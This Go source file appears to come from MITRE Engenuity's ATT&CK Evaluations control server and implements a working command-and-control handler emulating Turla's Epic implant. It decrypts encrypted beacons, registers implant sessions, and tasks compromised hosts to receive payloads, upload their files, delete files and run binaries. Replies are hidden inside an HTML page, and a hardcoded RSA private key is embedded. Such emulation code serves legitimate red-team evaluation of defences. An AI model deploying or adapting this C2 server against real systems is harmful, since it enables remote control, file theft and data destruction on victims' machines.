package epic

import (
	"bytes"
	"context"
	"crypto/rsa"
	"encoding/json"
	"errors"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/http/httputil"
	"strconv"
	"strings"
	"time"

	"attackevals.mitre-engenuity.org/control_server/config"
	"attackevals.mitre-engenuity.org/control_server/handlers/util"
	"attackevals.mitre-engenuity.org/control_server/logger"
	"attackevals.mitre-engenuity.org/control_server/sslcerts"
	"github.com/gorilla/mux"
)

// Note: we use two bzip2 libraries.
// The std library bzip2 (compress/bzip2) has decompression implemented but not compression.
// Dsnet's bzip2 library has both compression and decompression implemented, but only compression
// worked when tested.

const (
    serverErrMsg            = "Internal server error\n"
    defaultHtmlTemplatePath = "handlers/epic/templates/home.html"
    embedPlaceholder        = "<div></div>"
    embedFormat             = "<div>%s</div>"

    // standard UUID is 8-4-4-4-12, but we want 8-4-4-6 according to:
    // https://securelist.com/the-epic-turla-operation/65545/
    firstUUID  = "218780a0-870e-480e-b2c5dc"
    secondUUID = "51515228-8a7b-4226-e6e3f4"

    serverPrivateKey = "MIIEpAIBAAKCAQEAstMVvgSi/YAppi1E4ToYS814d951GBa2UH4xzsT3nuGr3zhriYv/W5X2nEkrRS3/yeB+dxmMq/u4LmPiOo6Zjzw8xgfCQq4j8Enib2z+XAHGbysoCvF09Gk/Cx7hCjl5iu/aFbRRmODPAROdyj5opdQvam0IgS2k7K02S6cofPw2OBaB1E4bY8TiQSc8ysnI7Z1jSDwuwFWYrGTR8oYSbq85nMbrJx742y/bWE3ujbg9vaUlN/40urRCZKOLSutD9QVhMk7H7mHycJif3npndDoWM3GnSuwsWuiKZjTaZM1EBoNEsDa2+gMpNTGF4QWc9Fupmk7L5ujfAXrGBsdwNwIDAQABAoIBAFFtUM8vqVApVc23e0/bdki+DQb4IvWPEgFhFSkEA4UzWWHRfRYqy2JWzO6pWqyrn3e7Y5qz5ZxCiMGG9fKYEFBqq3m4+roGNZMq8ZKvXLtki4j/a8Jf5FOOwQg9TVesiC29vd54N1eXtmrVFdqLxHcOQXECqQa5VAn5bWnRedw+8UcOZktKVkKiZrZuh4nmABWyWQaDnP0ppCvA0iUXR13ZiaUfuBGTIJY+sV6fb6IuTXnytw3Tqd5q9hqinyvG9ao7WsC8BdJebbknDBBBBSW14Qp2WS3IzeLPdgjNJWI8zhzmwMG/BmQ+wf8Plfh32J34Z/OOgdCSNVjSax9/9CECgYEA2bFVaHozoek11z7v5oGKF6d4s7ps2++TkqUGeSj1tbi0AE36GAar+PwP1CFQ/aV3EoWa6G0PU8/iVSX4vRkx4S4wtLi2qVhNVCJMhMIUrCsdBldfWs3M6OOUZIvP6qKo4rZSHEcnSx1zssuErf0vat1NkJhl/mAg1ODaZ2l0hnkCgYEA0krPdwyVIkuptet48h6m3/7EMD3NGOvGWlOSUPtOnMzCFAC07pEgVeb9PK6VMLeu/m/Zo+J3Zk/85o6Yd1vt6IXMAECBkgPvUXaO56m6SVtO7lT3EttvN9ZDnk9yUURcwU8wgkHo5xKLMDmWbWm7UYX3arFAEaFxd0WIgS/IwC8CgYEAjPIEGmEEjRAxi+tz6Ap3HlmQDM3nLX8wTQIL7uZWMBImeQwDoQqwzcRlezMW/SLktVlLsrDp+5ndMMQlCEoHwYPmhRwTKBHD/3U1lb8TI2XGpRRs6J3WzfKLYY4kUAaA0ki5YRWwmzG2d0zN2tjSmp4uWjBR2SDkIPB0eAAPMgECgYBe7LQPqhdbnsnhu4QhzuJG9Ep8+DiviiZEObsvYPFQaEEnJFaH5eyxug4PqULg9dlBMx4MEzsQbQTc0ftSzaVrs5Gtf3C9h5csr5a8TeowGM5dWO8ajQD8NHTbbkNNGc3A2M0tzzChtcYso6Iai4Kpvw47E/22t6hvTWzb28UDswKBgQDHuTifkaiwGsEbnptb0arl3wcFnUIMYkUUYU0jLUD4eAf3Rwb53dSetykJOuo4qs7RDIy164Qu6Zz56fLYx6Kl135px6qy3YlM411LdypdXJCJYOieOSYKgoZPNZpFgTEe8BcG0oTC/pL3k+kSgFSaSIADD7pa8/8FsXAroJyPCw=="
    implantPublicKey = "MIIBCgKCAQEAwW0oKmH7vxoenqqYijGD9RALZfAEPC4auVp1wyrQ2j/7sD7ecWcylXgu+3YMqGuUrQdUKswmRMlvLfwiiqeyjFusMi+IILL+Sue5hGKJ5BPGCGO6gl4Hr8WcNCQ7f/idT8x5mvhcSlrTZb/Nit5X5kCZymomQE1dDVwUv+5YSap2zwaqE7oNch6kTBgRut5nZaPqg1NS+V5zrEpoKcu1VQ7cvOwrvdAKQYIfX+04Jg9DNMZDo18wp6lhQ1CEiHP7rxo2znyKYOG9irRX0VIBW8TQbp5flf3GXKJRRmhMtA8Nq3om0P6wMP2cTt6QFevIczhOYnU3ZwnLjxJp3WcSOQIDAQAB"

    fileDownloadTaskKey     = "name"
    fileDownloadImplantType = "download"
    fileUploadTaskKey       = "result"
    fileUploadImplantType   = "upload"
    fileDeleteTaskKey       = "del_task"
    fileDeleteImplantType   = "delete"
)

// The fields expected to be received from the json in the implant's request
type ImplantRequest struct {
    Uuid              string `json:"UUID"`
    CmdType           string `json:"type"`
    DataBase64Encoded string `json:"data"`
    Data              []byte // data field that implant sends is base64 encoded; once we unmarshal json, we will base64 decode the data and place it here
}

// Wrapper type that represents a function that will take a server response and template and embed the response as needed
type responseWrapperFunc func(string, string) (string, error)

// Represents our Epic HTTP(S) handler. Will implement the util.Handler interface.
type EpicHandler struct {
    restAPIaddress      string
    server              *http.Server
    listenAddress       string
    templatePath        string
    htmlTemplate        string
    responseWrapper     responseWrapperFunc
    commandNumbers      map[string]uint32 // maps known implant UUIDs to the next command number available (starting with 0)
    pendingCommandOutput map[string]map[int]bool
    useFirstUUID        bool
    pendingUploads      map[string]string
    serverRsaPrivateKey *rsa.PrivateKey
    implantRsaPublicKey *rsa.PublicKey
}

// epicHandlerFactory is the factory method for creating our handler.
// Args:
//
//	responseWrapper: the function that embeds response data into an HTML page
//	templatePath: the path to the HTML page to embed data into
//
// Returns a pointer to an Epic handler
func epicHandlerFactory(responseWrapper responseWrapperFunc, templatePath string) *EpicHandler {
    // Import RSA keys
    pubKey, err := ImportRsaPubKey("")
    if err != nil {
        panic("Failed to import RSA public key: " + err.Error())
    }
    privKey, err := ImportRsaPrivKey("")
    if err != nil {
        panic("Failed to import RSA private key: " + err.Error())
    }
    // restAPIaddress, server, and listenAddress will be initialized when handler is started
    return &EpicHandler{
        templatePath:        templatePath,
        responseWrapper:     responseWrapper,
        commandNumbers:      make(map[string]uint32),
        pendingCommandOutput: make(map[string]map[int]bool),
        useFirstUUID:        true,
        pendingUploads:      make(map[string]string),
        serverRsaPrivateKey: privKey,
        implantRsaPublicKey: pubKey,
    }
}

// htmlResponseWrapper takes a response string and embeds it in the html page.
// Args:
//
//	toEmbed: the string that should be embedded into an HTML page
//	template: the HTML template to embed text into
//
// Returns the new HTML page with the text embedded an any errors received
func htmlResponseWrapper(toEmbed string, template string) (string, error) {
    if strings.Contains(template, embedPlaceholder) {
        formattedEmbed := fmt.Sprintf(embedFormat, toEmbed)
        return strings.Replace(template, embedPlaceholder, formattedEmbed, 1), nil
    }
    return "", errors.New("Invalid template - missing the placeholder for the embedded response")
}

// init creates and adds the EpicHandler to the map of available C2 handlers.
func init() {
    util.AvailableHandlers["epic"] = epicHandlerFactory(htmlResponseWrapper, defaultHtmlTemplatePath)
}

// StartHandler starts the Epic C2 handler.
// Args:
//
//	restAddress: address of the C2 server's REST API address
//	configEntry: C2 handler configurations
//
// Returns any errors received
func (epicHandler *EpicHandler) StartHandler(restAddress string, configEntry config.HandlerConfigEntry) error {
    listenAddress, err := config.GetHostPortString(configEntry)
    if err != nil {
        return err
    }
    epicHandler.listenAddress = listenAddress

    useHttpsBool, err := strconv.ParseBool(configEntry["use_https"])
    if err != nil {
        return err
    }

    if useHttpsBool {
        logger.Info("Starting Epic HTTPS Handler")
    } else {
        logger.Info("Starting Epic HTTP Handler")
    }

    // make sure we know the REST API address
    epicHandler.restAPIaddress = restAddress

    // make sure we can access the HTML template page for responses
    templateData, err := ioutil.ReadFile(epicHandler.templatePath)
    if err != nil {
        return err
    }
    epicHandler.htmlTemplate = string(templateData)

    // initialize URL router
    urlRouter := mux.NewRouter()

    epicHandler.server = &http.Server{
        Addr:         epicHandler.listenAddress,
        WriteTimeout: time.Second * 15,
        ReadTimeout:  time.Second * 15,
        IdleTimeout:  time.Second * 60,
        Handler:      urlRouter,
    }

    // bind HTTP(S) routes to their functions
    urlRouter.HandleFunc("/", epicHandler.handleRequest).Methods("POST")

    if useHttpsBool {
        certFile, ok := configEntry["cert_file"]
        if !ok {
            certFile = ""
        }
        keyFile, ok := configEntry["key_file"]
        if !ok {
            keyFile = ""
        }
        needToGenCert := sslcerts.CheckCert(certFile, keyFile)
        if needToGenCert {
            certFile, keyFile = sslcerts.GenerateSSLcert("epic")
        }
        logger.Info(fmt.Sprintf("\nEpic HTTPS cert: ./%s\nEpic HTTPS key: ./%s", certFile, keyFile))

        // start handler in goroutine so it doesn't block
        go func() {
            err := epicHandler.server.ListenAndServeTLS(certFile, keyFile)
            if err != nil && err.Error() != "https: Server closed" {
                logger.Error(err)
            }
        }()
    } else {
        // start handler in goroutine so it doesn't block
        go func() {
            err := epicHandler.server.ListenAndServe()
            if err != nil && err.Error() != "http: Server closed" {
                logger.Error(err)
            }
        }()
    }
    return nil
}

// StopHandler kills the Epic handler.
// Returns any errors received
func (epicHandler *EpicHandler) StopHandler() error {
    logger.Info("Killing Epic HTTP server")
    emptyContext := context.Background()
    return epicHandler.server.Shutdown(emptyContext)
}

// errorOut takes an error message, writes it to the logs, and returns a 500 to the client
// Args:
//
//	httpWriter: the HTTP response writer
//	errorMsg: the error message to write to the logs
func errorOut(httpWriter http.ResponseWriter, errorMsg string) {
    logger.Error(errorMsg)
    httpWriter.WriteHeader(http.StatusInternalServerError)
    httpWriter.Write([]byte(serverErrMsg))
}

// getImplantRequest parses out relevant information from an implant HTTP(S) request.
// Args:
//
//	request: the HTTP request
//
// Returns an ImplantRequest object and any errors received
func (epicHandler *EpicHandler) getImplantRequest(request *http.Request) (ImplantRequest, error) {
    // get the body (expecting file path to the implant's discoveries that is base64 encoded)
    body, err := ioutil.ReadAll(request.Body)
    if err != nil {
        return ImplantRequest{}, err
    }

    // base64 decode the request
    decodedRequest, err := Base64Decode(string(body))
    if err != nil {
        return ImplantRequest{}, err
    }

    // decrypt the request
    copyDecodedRequest := make([]byte, len(decodedRequest))
    copy(copyDecodedRequest, decodedRequest)
    decryptedRequest, err := Decrypt(decodedRequest, epicHandler.serverRsaPrivateKey)
    if err != nil {
        // the first implant request is not encrypted in accordance with
        // https://securelist.com/the-epic-turla-operation/65545/
        // this means that rsa decryption should error out because we're
        // passing in the bzip2-compressed data
        decryptedRequest = copyDecodedRequest
    }

    // uncompress request with bzip2
    decompressedRequest, err := Bzip2Decompress(decryptedRequest)
    if err != nil {
        return ImplantRequest{}, err
    }

    // convert decoded request into an ImplantRequest structure
    var jsonReq ImplantRequest
    err = json.Unmarshal(decompressedRequest, &jsonReq)
    if err != nil {
        return ImplantRequest{}, err
    }

    // base64 decode the data field in the implant's request
    decodedData, err := Base64Decode(jsonReq.DataBase64Encoded)
    if err != nil {
        return ImplantRequest{}, err
    }
    jsonReq.Data = decodedData

	return jsonReq, nil
}

// hasImplantSession checks if the handler has a active session on an implant.
// Args:
//
//	uuid: the UUID of the implant to check
//
// Returns true if an implant with the UUID exists; false otherwise
func (epicHandler *EpicHandler) hasImplantSession(uuid string) bool {
    _, ok := epicHandler.commandNumbers[uuid]
    return ok
}

// createNewSessionDataBytes returns the request that should be sent to the C2 server to register
// an implant.
// Args:
//
//	id: the UUID of the implant to register
//
// Returns the information that should be sent to the C2 server to register an implant
func createNewSessionDataBytes(id string) []byte {
    jsonStr, err := json.Marshal(map[string]string{"guid": id})
    if err != nil {
        logger.Error(fmt.Sprintf("Failed to create JSON info for session for UUID %s: %s", id, err.Error()))
        return nil
    }
    return []byte(jsonStr)
}

// isSessionRegistered returns true if the UUID is already registered, false otherwise and on error
//
//	restAPIaddress: address of C2 server's REST API
//	uuid: UUID of the implant that should be checked
//
// Returns true if the UUID is already registered
func isSessionRegistered(restAPIaddress string, uuid string) bool {
    url := "http://" + restAPIaddress + "/api/v1.0/session/exists/" + uuid

    response, err := http.Get(url)
    if err != nil {
        logger.Error(err.Error())
        return false
    }
    defer response.Body.Close()
    responseData, err := util.ExtractRestApiStringResponsedData(response)
    if err != nil {
        logger.Error(err.Error())
        return false
    }

    exists, err := strconv.ParseBool(responseData)
    if err != nil {
        logger.Error(err.Error())
        return false
    }

    return exists
}

// forwardDeregisterImplant sends a HTTP(S) request to the C2 server to deregister an implant.
// Args:
//
//	restAPIaddress: address of C2 server's REST API
//	uuid: UUID of the implant that should be deregisters
//
// Returns any errors received
func forwardDeregisterImplant(restAPIaddress string, uuid string) error {
    url := "http://" + restAPIaddress + "/api/v1.0/session/delete/" + uuid

    // initialize HTTP(S) request
    req, err := http.NewRequest("DELETE", url, bytes.NewBuffer([]byte{}))
    if err != nil {
        return err
    }

    // execute HTTP(S) DELETE request
    client := &http.Client{}
    _, err = client.Do(req)
    if err != nil {
        return err
    }
    return nil
}

// forwardRegisterImplant sends a HTTP(S) request to the C2 server to register an implant.
// Args:
//
//	restAPIaddress: address of the C2 server's REST API
//	implantData: the data needed to register an implant in format: '{"guid": "<uuid>"}', as bytes
//
// Returns response from REST API and any errors received
func forwardRegisterImplant(restAPIaddress string, implantData []byte) (string, error) {
    url := "http://" + restAPIaddress + "/api/v1.0/session"

    // initialize HTTP(S) request
    req, err := http.NewRequest("POST", url, bytes.NewBuffer(implantData))
    if err != nil {
        return "", err
    }
    req.Header.Set("Content-Type", "application/json")

    // execute HTTP(S) POST request and read response
    client := &http.Client{}
    response, err := client.Do(req)
    if err != nil {
        return "", err
    }
    defer response.Body.Close()
    if response.StatusCode != 200 {
        return "", err
    }
    return util.ExtractRestApiStringResponsedData(response)
}

// registerNewImplant initialize a new session for a new implant session. We use two hard coded
// UUIDs so that execution is reproducible. UUIDs are deregistered before they are assigned to an
// implant, so that way, more than two implants can be registered. However, only two implants can
// be registered at a time.
// Return new implant's UUID and any errors received
func (epicHandler *EpicHandler) registerNewImplant() (string, error) {
    // decide on whether to use first or second UUID
    var id string
    if epicHandler.useFirstUUID {
        id = firstUUID
    } else {
        id = secondUUID
    }
    epicHandler.useFirstUUID = !epicHandler.useFirstUUID

    exists := isSessionRegistered(epicHandler.restAPIaddress, id)
    if exists {
        // deregister the UUID
        err := forwardDeregisterImplant(epicHandler.restAPIaddress, id)
        if err != nil {
            return "", err
        }
    }

    // register the UUID with the new implant
    implantData := createNewSessionDataBytes(id)
    restResponse, err := forwardRegisterImplant(epicHandler.restAPIaddress, implantData)
    if err != nil {
        return "", err
    }
    epicHandler.commandNumbers[id] = 0
    logger.Info(restResponse)
    logger.Success(fmt.Sprintf("Successfully created session for implant %s.", id))
    return id, nil
}

// processAndForwardUpload processes file upload and forward it to the REST API server.
// Args:
//
//	restAPIaddress: the address of the C2 server's REST API
//	fileName: name of file to upload to the server
//	data: the contents of the file to upload to the server
//
// Returns REST API server response and any errors received
func processAndForwardUpload(restAPIaddress string, fileName string, data []byte) (string, error) {
    url := "http://" + restAPIaddress + "/api/v1.0/upload/" + fileName
    resp, err := http.Post(url, "application/octet-stream", bytes.NewBuffer(data))
    if err != nil {
        return "", err
    }
    defer resp.Body.Close()
    return util.ExtractRestApiStringResponsedData(resp)
}

// forwardGetTask queries the REST API for tasks for the implant with the specified UUID.
// Args:
//
//	restAPIaddress: the address of the C2 server's REST API
//	id: the UUID of the implant to get a task for
//
// Returns the task as a string and any errors received
func forwardGetTask(restAPIaddress string, id string) (string, error) {
    url := "http://" + restAPIaddress + "/api/v1.0/session/" + id + "/task"
    response, err := http.Get(url)
    if err != nil {
        return "", err
    }
    defer response.Body.Close()
    sessionData, err := ioutil.ReadAll(response.Body)
    if err != nil {
        return "", err
    }
    return string(sessionData), err
}

// forwardGetFileFromServer receives file from the control server. Errors are
// returned if the file does not exist.
// Args:
//
//	restAPIaddress: the address of the C2 server's REST API
//	fileName: the name of the file to retrieve from the server
//
// Returns the contents of the file and any errors received
func forwardGetFileFromServer(restAPIaddress string, fileName string) ([]byte, error) {
    url := "http://" + restAPIaddress + "/api/v1.0/files/epic/" + fileName
    resp, err := http.Get(url)
    var filedata []byte
    if err != nil {
        return filedata, err
    }
    if resp.StatusCode != 200 {
        return filedata, errors.New("Server did not return requested file: " + fileName)
    }
    filedata, err = ioutil.ReadAll(resp.Body)
    if err != nil {
        return filedata, err
    }
    return filedata, nil
}

// convertTaskToResponse creates the response data to the implant.
// Args:
//
//	id: the UUID of the implant
//	taskString: the task as retrieved from the C2 server's REST API
//	newImplant: true if this is the first time the server has responded to the implant; false
//	  otherwise
//
// Returns the response that should be sent to the implant and any errors received
func (epicHandler *EpicHandler) convertTaskToResponse(id string, taskString string, newImplant bool) (string, error) {
    // make response structure
    commandBuffer := CommandBuffer{
        commandId: epicHandler.commandNumbers[id],
        payload:   []byte{},
        config:    make(map[string]string),
    }

    // parse the task from the C2 client
    trimmedTask := strings.TrimSpace(taskString)
    tokens := strings.Split(trimmedTask, "|")
    for i := 0; i < len(tokens); i++ {
        tokens[i] = strings.TrimSpace(tokens[i])
    }

    if len(tokens) < 2 && taskString != "" {
        return "", errors.New(fmt.Sprintf("Task has an incorrect number of arguments. Expected at least 2 '|' delimited, got %d. Provided: '%s'", len(tokens), taskString))
    }

    // populate struct with client uuid if this is the first response to implant
    if newImplant {
        commandBuffer.addToConfig("ID", id)
    }

    // create pendingCommandOutput map if not existing
    if _, ok := epicHandler.pendingCommandOutput[id]; !ok {
        epicHandler.pendingCommandOutput[id] = make(map[int]bool)
    }

    // increment the command id for the next round of exchange
    epicHandler.commandNumbers[id]++

    // populate struct with task, if one exists
    if taskString != "" {
        commandType := tokens[0]
        if commandType == fileDownloadTaskKey {
            // task requires server to send fileToDownload to implant and implant to write file to implantFilePathToWriteTo
            if len(tokens) != 3 {
                return "", errors.New(fmt.Sprintf("Download task expects 3 '|' delimited tokens, got %d. Provided '%s'", len(tokens), taskString))
            }

            implantFilePathToWriteTo := tokens[1]
            fileToDownload := tokens[2]
            fileData, err := forwardGetFileFromServer(epicHandler.restAPIaddress, fileToDownload)
            if err != nil {
                // decrement the command id for failed exchange
                epicHandler.commandNumbers[id]--
                return "", errors.New(fmt.Sprintf("Unable to retrieve file from server: %s", err.Error()))
            } else {
                logger.Info(fmt.Sprintf("Successfully retrieved file from server: %s", fileToDownload))
            }

            commandBuffer.payload = fileData
            commandBuffer.addToConfig(commandType, implantFilePathToWriteTo)
            epicHandler.pendingCommandOutput[id][int(epicHandler.commandNumbers[id])] = true

        } else if commandType == fileUploadTaskKey {
            // task requires implant to upload the file at filePathToUpload
            filePathToUpload := tokens[1]
            epicHandler.pendingUploads[id] = filePathToUpload
            commandBuffer.addToConfig(commandType, filePathToUpload)
            epicHandler.pendingCommandOutput[id][int(epicHandler.commandNumbers[id])] = true

        } else if commandType == fileDeleteTaskKey {
            // task requires implant to delete filePathToDelete from disk
            filePathToDelete := tokens[1]
            commandBuffer.addToConfig(commandType, "")
            commandBuffer.addToConfig("name", filePathToDelete)
            epicHandler.pendingCommandOutput[id][int(epicHandler.commandNumbers[id])] = true

        } else {
            // some other task, which includes:
            // - executing binary, where commandData is the binary to run
            commandData := tokens[1]
            commandBuffer.addToConfig(commandType, commandData)
            epicHandler.pendingCommandOutput[id][int(epicHandler.commandNumbers[id])] = true
        }
    }

    rawOutput := commandBuffer.buildImplantCommand()

    // compress response with bzip2
    bzip2Output, err := Bzip2Compress(rawOutput)
    if err != nil {
        return "", err
    }

    // encrypt response
    encryptedOutput, err := Encrypt(bzip2Output, epicHandler.implantRsaPublicKey)
    if err != nil {
        return "", err
    }

    // base64 encode the compressed response
    responseContent := Base64Encode(encryptedOutput)
    // responseContent := Base64Encode(bzip2Output)

    // put the compressed response content in the HTML template
    response, err := epicHandler.responseWrapper(responseContent, epicHandler.htmlTemplate)
    if err != nil {
        return "", errors.New(fmt.Sprintf("Failed to fetch implant task: %s", err.Error()))
    }

    return response, nil
}

// handleRequest is the main function that processes the implant request and sends a response.
// Args:
//
//	httpWriter: the HTTP response writer to send responses back to the implant
//	request: the request from the implant
func (epicHandler *EpicHandler) handleRequest(httpWriter http.ResponseWriter, request *http.Request) {
    // log the request
    _, err := httputil.DumpRequest(request, true)
    if err != nil {
        logger.Error(fmt.Sprintf("Failed to print POST request: %s", err.Error()))
    }

    // read and parse json request from implant
    jsonReq, err := epicHandler.getImplantRequest(request)
    if err != nil {
        errorOut(httpWriter, fmt.Sprintf("Could not get implant request: %s", err.Error()))
        return
    }

    var id string
    var newImplant bool
    if jsonReq.Uuid == "" {
        // handle new implant session (implant request with no uuid means it is new)
        id, err = epicHandler.registerNewImplant()
        if err != nil {
            errorOut(httpWriter, fmt.Sprintf("Failed to register implant session: %s", err.Error()))
            return
        }
        newImplant = true
        logger.Info("New implant registered with UUID: " + id)
    } else if epicHandler.hasImplantSession(jsonReq.Uuid) {
        // handle existing implant session (though double check to make sure server has a record of the session)
        id = jsonReq.Uuid
        newImplant = false
        logger.Info("Received request from UUID: " + id)

        pendingOutput := epicHandler.pendingCommandOutput[id]
        if len(pendingOutput) == 0 {
            logger.Info(fmt.Sprintf("No tasks pending output for UUID: %s", id))
            if jsonReq.CmdType == fileUploadImplantType {
                errorOut(httpWriter, fmt.Sprintf("There is no pending upload for %s", id))
                return
            }
        } else {
            taskOutput := jsonReq.Data
            if jsonReq.CmdType == fileDownloadImplantType || jsonReq.CmdType == fileDeleteImplantType {
                // Get the results of implant downloading or deleting file
                if string(jsonReq.Data) == "" {
                    if jsonReq.CmdType == fileDownloadImplantType {
                        taskOutput = []byte("Implant successfully downloaded file.")
                    } else {
                        taskOutput = []byte("Implant successfully deleted file.")
                    }
                } else {
                    logger.Error(string(jsonReq.Data))
                    taskOutput = jsonReq.Data
                }
            } else if jsonReq.CmdType == fileUploadImplantType {
                // Upload file
                filepath, ok := epicHandler.pendingUploads[id]
                if !ok {
                    errorOut(httpWriter, fmt.Sprintf("There is no pending upload for %s", id))
                    return
                } else {
                    // Save upload file
                    splitPath := strings.Split(filepath, "\\")
                    filename := splitPath[len(splitPath)-1]
                    logger.Info("Received file upload request for file name:", filename)
                    response, err := processAndForwardUpload(epicHandler.restAPIaddress, filename, jsonReq.Data)
                    if err != nil {
                        errorOut(httpWriter, fmt.Sprintf("Unable to upload file: %s", err.Error()))
                        return
                    } else if strings.HasPrefix(response, "Successfully uploaded") {
                        // implant file successfully uploaded, remove the pending upload
                        taskOutput = []byte(response)
                        delete(epicHandler.pendingUploads, id)
                    } else {
                        // rest api returns error message in the response
                        errorOut(httpWriter, fmt.Sprintf("Unable to upload file: %s", response))
                        return
                    }
                }
            }
            //forward the task output the to rest API
            restResponse, err := util.ForwardTaskOutput(epicHandler.restAPIaddress, id, taskOutput)
            if err != nil {
                logger.Error(fmt.Sprintf("Failed to process and forward task output: %s", err.Error()))
            }
            logger.Success(string(restResponse))
            delete(epicHandler.pendingCommandOutput[id], int(epicHandler.commandNumbers[id]))
        }

    } else {
        // ??? we should never get here ???
        errorOut(httpWriter, "Server cannot find UUID: "+jsonReq.Uuid)
        return
    }

    // Forward Beacon to CALDERA
    if config.IsCalderaForwardingEnabled() {
        apiResponse, err := util.ForwardImplantBeacon(id, epicHandler.restAPIaddress)
        if err != nil {
            logger.Error(fmt.Sprintf("Error occured while forwarding implant beacon to CALDERA for session %s: %s", id, err.Error()))
        } else {
            logger.Info(fmt.Sprintf("Successfully forwarded implant beacon for session %s to CALDERA: %s", id, apiResponse))
        }
    }

    // get the task from the C2 client to send to the implant
    task, err := forwardGetTask(epicHandler.restAPIaddress, id)
    if err != nil {
        errorOut(httpWriter, fmt.Sprintf("Failed to fetch implant task: %s", err.Error()))
        return
    }

    // convert the task to the format that the implant expects
    response, err := epicHandler.convertTaskToResponse(id, task, newImplant)
    if err != nil {
        errorOut(httpWriter, fmt.Sprintf("Failed to convert task to response: %s", err.Error()))
        return
    }

    if len(task) > 0 {
        logger.Info("Sending new task to UUID: " + id)
    } else {
        logger.Info("Sending empty task to UUID: " + id)
    }

    // send response to client
    httpWriter.WriteHeader(http.StatusOK)
    httpWriter.Write([]byte(response))
}
